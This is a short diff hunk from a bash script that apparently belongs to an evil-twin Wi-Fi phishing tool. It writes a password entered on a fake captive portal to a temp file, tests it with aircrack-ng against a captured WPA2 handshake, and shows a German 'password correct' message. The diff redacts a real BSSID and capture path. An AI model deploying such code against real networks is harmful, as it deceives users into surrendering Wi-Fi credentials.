@@ -23,7 +23,7 @@ if [[ "${#password}" -ge 8 ]] && [[ "${#password}" -le 63 ]]; then
 rm -rf "/tmp/www/ag.et_currentpass.txt" > /dev/null 2>&1
 echo "${password}" >\
 "/tmp/www/ag.et_currentpass.txt"
-aircrack-ng -a 2 -b C4:04:15:1D:C1:FC -w "/tmp/www/ag.et_currentpass.txt" "/opt/wef/main/captures/MOVISTAR_45B0_EXT/2023-06-26-21-04-58-capture-01.cap" | grep "KEY FOUND!" > /dev/null
+aircrack-ng -a 2 -b XX:XX:XX:XX:XX:XX -w "/tmp/www/ag.et_currentpass.txt" "/opt/wef/main/captures/XXXXXX/XXXX.cap" | grep "KEY FOUND!" > /dev/null
 if [ "$?" = "0" ]; then
 touch "/tmp/www/ag.et_success.txt" > /dev/null 2>&1
 echo 'Das Passwort ist richtig, die Verbindung wird in kurzer Zeit wiederhergestellt'
